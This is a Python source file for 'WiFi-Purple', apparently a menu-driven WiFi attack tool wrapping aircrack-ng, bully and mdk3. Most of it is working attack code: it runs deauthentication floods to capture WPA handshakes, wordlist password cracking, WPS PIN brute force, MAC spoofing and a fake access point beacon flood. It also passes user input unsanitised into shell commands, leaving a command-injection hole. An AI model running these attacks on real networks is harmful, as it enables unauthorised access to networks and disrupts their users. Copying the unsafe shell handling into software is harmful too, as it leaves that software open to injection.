#!/usr/bin/env python3
"""
WiFi-Purple - WiFi Security Testing Tool
By EmreKybs
"""

import os
import sys
import time
import subprocess
from typing import Optional
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()


class WiFiPurple:
    """Main class for WiFi-Purple tool"""
    
    def __init__(self):
        self.console = console
        
    def show_banner(self):
        """Display the application banner"""
        banner_text = """
[purple bold]
 _    _ ___________ _____     ______ _   _____________ _      _____ 
| |  | |_   _|  ___|_   _|    | ___ \\ | | | ___ \\ ___ \\ |    |  ___|
| |  | | | | | |_    | |______| |_/ / | | | |_/ / |_/ / |    | |__  
| |/\\| | | | |  _|   | |______|  __/| | | |    /|  __/| |    |  __| 
\\  /\\  /_| |_| |    _| |_     | |   | |_| | |\\ \\| |   | |____| |___ 
 \\/  \\/ \\___/\\_|    \\___/     \\_|    \\___/\\_| \\_\\_|   \\_____/\\____/

🌐 By EmreKybs 🌐
A Modern WiFi Security Testing Tool
[/purple bold]
"""
        self.console.print(Panel(banner_text, border_style="purple"))
    
    def show_menu(self):
        """Display the main menu"""
        table = Table(
            title="[bold cyan]WiFi-Purple - Main Menu[/bold cyan]",
            show_header=True,
            header_style="bold magenta",
            border_style="purple"
        )
        
        table.add_column("No", style="cyan bold", justify="center", width=6)
        table.add_column("Option", style="green bold", width=25)
        table.add_column("Description", style="white", width=50)
        
        menu_items = [
            ("1", "Start Monitor Mode", "Enable monitor mode on your WiFi adapter"),
            ("2", "Stop Monitor Mode", "Disable monitor mode and return to managed mode"),
            ("3", "View Interfaces", "Display all network interfaces"),
            ("4", "Restart Network", "Restart NetworkManager service"),
            ("5", "Scan Networks", "Scan for nearby WiFi networks"),
            ("6", "Capture Handshake", "Capture WPA/WPA2 handshake"),
            ("7", "Crack Password", "Crack captured handshake with wordlist"),
            ("8", "WPS Attack", "Perform WPS PIN attack using Bully"),
            ("9", "Change MAC Address", "Spoof your MAC address"),
            ("10", "Fake Access Point", "Create fake AP using mdk3"),
            ("0", "Exit", "Exit the application"),
        ]
        
        for no, option, desc in menu_items:
            table.add_row(no, option, desc)
        
        self.console.print(table)
    
    def run_command(self, cmd: str, description: str = "Running command") -> bool:
        """Execute a shell command with progress indicator"""
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=self.console
            ) as progress:
                task = progress.add_task(f"[yellow]{description}...", total=None)
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=False,
                    text=True
                )
                progress.update(task, completed=True)
            
            if result.returncode == 0:
                self.console.print(f"[green]✓ {description} completed successfully![/green]")
                return True
            else:
                self.console.print(f"[red]✗ Command failed with return code {result.returncode}[/red]")
                return False
                
        except subprocess.CalledProcessError as e:
            self.console.print(f"[red]✗ Error: {e}[/red]")
            return False
        except KeyboardInterrupt:
            self.console.print("\n[yellow]⚠ Operation cancelled by user[/yellow]")
            return False
    
    def start_monitor_mode(self):
        """Start monitor mode on interface"""
        self.console.print("\n[bold cyan]═══ Start Monitor Mode ═══[/bold cyan]\n")
        interface = Prompt.ask(
            "[white]Enter interface name[/white]",
            default="wlan0"
        )
        
        cmd = f"airmon-ng check kill && airmon-ng start {interface}"
        self.run_command(cmd, "Starting monitor mode")
        time.sleep(2)
    
    def stop_monitor_mode(self):
        """Stop monitor mode on interface"""
        self.console.print("\n[bold cyan]═══ Stop Monitor Mode ═══[/bold cyan]\n")
        interface = Prompt.ask(
            "[white]Enter monitor interface name[/white]",
            default="wlan0mon"
        )
        
        cmd = f"airmon-ng stop {interface}"
        self.run_command(cmd, "Stopping monitor mode")
        time.sleep(2)
    
    def view_interfaces(self):
        """Display network interfaces"""
        self.console.print("\n[bold cyan]═══ Network Interfaces ═══[/bold cyan]\n")
        self.run_command("ifconfig", "Listing interfaces")
        time.sleep(3)
    
    def restart_network(self):
        """Restart NetworkManager"""
        self.console.print("\n[bold cyan]═══ Restart Network ═══[/bold cyan]\n")
        self.console.print("[yellow]Restarting NetworkManager...[/yellow]")
        
        cmd = "service NetworkManager stop && service NetworkManager start && airmon-ng check kill"
        self.run_command(cmd, "Restarting network services")
        time.sleep(2)
    
    def scan_networks(self):
        """Scan for WiFi networks"""
        self.console.print("\n[bold cyan]═══ Scan Networks ═══[/bold cyan]\n")
        interface = Prompt.ask(
            "[white]Enter monitor interface[/white]",
            default="wlan0mon"
        )
        
        self.console.print("\n[red bold]⚠ Press CTRL+C when finished scanning[/red bold]\n")
        time.sleep(2)
        
        cmd = f"airodump-ng {interface} -M --band abg"
        self.run_command(cmd, "Scanning networks")
    
    def capture_handshake(self):
        """Capture WPA handshake"""
        self.console.print("\n[bold cyan]═══ Capture Handshake ═══[/bold cyan]\n")
        
        interface = Prompt.ask("[white]Monitor interface[/white]", default="wlan0mon")
        
        self.console.print("\n[yellow]First, scan for targets...[/yellow]")
        self.console.print("[red bold]⚠ Press CTRL+C when you see your target[/red bold]\n")
        time.sleep(2)
        
        os.system(f"airodump-ng {interface} -M --band abg")
        
        self.console.print("\n[bold green]Enter target details:[/bold green]")
        bssid = Prompt.ask("[cyan]Target BSSID (MAC address)[/cyan]")
        channel = Prompt.ask("[cyan]Target Channel[/cyan]")
        output_path = Prompt.ask(
            "[cyan]Save handshake to[/cyan]",
            default="/tmp/handshake"
        )
        packets = Prompt.ask(
            "[cyan]Deauth packets (0 for continuous)[/cyan]",
            default="0"
        )
        
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {output_path} {interface} & sleep 3 && aireplay-ng -0 {packets} -a {bssid} {interface}"
        self.run_command(cmd, "Capturing handshake")
    
    def crack_password(self):
        """Crack captured handshake"""
        self.console.print("\n[bold cyan]═══ Crack Password ═══[/bold cyan]\n")
        
        handshake_file = Prompt.ask("[white]Handshake file path[/white]")
        wordlist = Prompt.ask(
            "[white]Wordlist path[/white]",
            default="/usr/share/wordlists/rockyou.txt"
        )
        
        cmd = f"aircrack-ng {handshake_file} -w {wordlist}"
        self.run_command(cmd, "Cracking password")
    
    def wps_attack(self):
        """Perform WPS attack using Bully"""
        self.console.print("\n[bold cyan]═══ WPS Attack (Bully) ═══[/bold cyan]\n")
        
        interface = Prompt.ask("[white]Monitor interface[/white]", default="wlan0mon")
        bssid = Prompt.ask("[cyan]Target BSSID[/cyan]")
        channel = Prompt.ask("[cyan]Target Channel[/cyan]")
        essid = Prompt.ask("[cyan]Target ESSID (name)[/cyan]")
        
        cmd = f"bully {interface} -b {bssid} -c {channel} -e {essid} --force -F -v 3"
        self.run_command(cmd, "Running WPS attack")
    
    def change_mac(self):
        """Change MAC address"""
        self.console.print("\n[bold cyan]═══ Change MAC Address ═══[/bold cyan]\n")
        
        interface = Prompt.ask("[white]Interface to change[/white]", default="wlan0")
        new_mac = Prompt.ask("[cyan]New MAC address (XX:XX:XX:XX:XX:XX)[/cyan]")
        
        cmd = f"ifconfig {interface} down && ifconfig {interface} hw ether {new_mac} && ifconfig {interface} up"
        if self.run_command(cmd, "Changing MAC address"):
            self.console.print(f"\n[green]✓ MAC address changed to: {new_mac}[/green]")
            time.sleep(2)
            os.system(f"ifconfig {interface}")
            time.sleep(3)
    
    def fake_ap(self):
        """Create fake access point"""
        self.console.print("\n[bold cyan]═══ Fake Access Point ═══[/bold cyan]\n")
        
        interface = Prompt.ask("[white]Interface[/white]", default="wlan0")
        channel = Prompt.ask("[cyan]Channel[/cyan]", default="6")
        
        create_dict = Confirm.ask(
            "[white]Create new AP dictionary?[/white]",
            default=False
        )
        
        if create_dict:
            self.run_command("bash AP_config.sh", "Creating AP dictionary")
        
        dictionary = Prompt.ask(
            "[cyan]Dictionary path[/cyan]",
            default="/wordlist/fakeAP.txt"
        )
        
        self.console.print("\n[red bold]⚠ Press CTRL+C to stop the attack[/red bold]\n")
        time.sleep(2)
        
        cmd = f"mdk3 {interface} b -f {dictionary} -a -s 1000 -c {channel}"
        self.run_command(cmd, "Creating fake access points")
    
    def show_goodbye(self):
        """Display goodbye message"""
        goodbye_text = """
[purple]Thank you for using WiFi-Purple![/purple]
[cyan]Good luck with your security testing![/cyan]
[green]https://github.com/emrekybs[/green]
"""
        self.console.print(Panel(goodbye_text, border_style="purple", title="[bold]Goodbye[/bold]"))
    
    def run(self):
        """Main application loop"""
        while True:
            try:
                os.system("clear" if os.name != "nt" else "cls")
                self.show_banner()
                self.show_menu()
                
                choice = Prompt.ask(
                    "\n[bold blue]Select an option[/bold blue]",
                    choices=[str(i) for i in range(11)],
                    default="0"
                )
                
                os.system("clear" if os.name != "nt" else "cls")
                self.show_banner()
                
                if choice == "1":
                    self.start_monitor_mode()
                elif choice == "2":
                    self.stop_monitor_mode()
                elif choice == "3":
                    self.view_interfaces()
                elif choice == "4":
                    self.restart_network()
                elif choice == "5":
                    self.scan_networks()
                elif choice == "6":
                    self.capture_handshake()
                elif choice == "7":
                    self.crack_password()
                elif choice == "8":
                    self.wps_attack()
                elif choice == "9":
                    self.change_mac()
                elif choice == "10":
                    self.fake_ap()
                elif choice == "0":
                    os.system("clear" if os.name != "nt" else "cls")
                    self.show_goodbye()
                    sys.exit(0)
                
                if choice != "0":
                    self.console.print("\n[yellow]Press Enter to continue...[/yellow]")
                    input()
                    
            except KeyboardInterrupt:
                self.console.print("\n\n[yellow]⚠ Interrupted by user[/yellow]")
                if Confirm.ask("[white]Do you want to exit?[/white]", default=True):
                    os.system("clear" if os.name != "nt" else "cls")
                    self.show_goodbye()
                    sys.exit(0)
            except Exception as e:
                self.console.print(f"\n[red]✗ Error: {e}[/red]")
                time.sleep(2)


def main():
    """Entry point"""
    # Check if running as root
    if os.geteuid() != 0:
        console.print("[red bold]⚠ This tool requires root privileges![/red bold]")
        console.print("[yellow]Please run with: sudo python3 wifi_purple_improved.py[/yellow]")
        sys.exit(1)
    
    app = WiFiPurple()
    app.run()


if __name__ == "__main__":
    main()
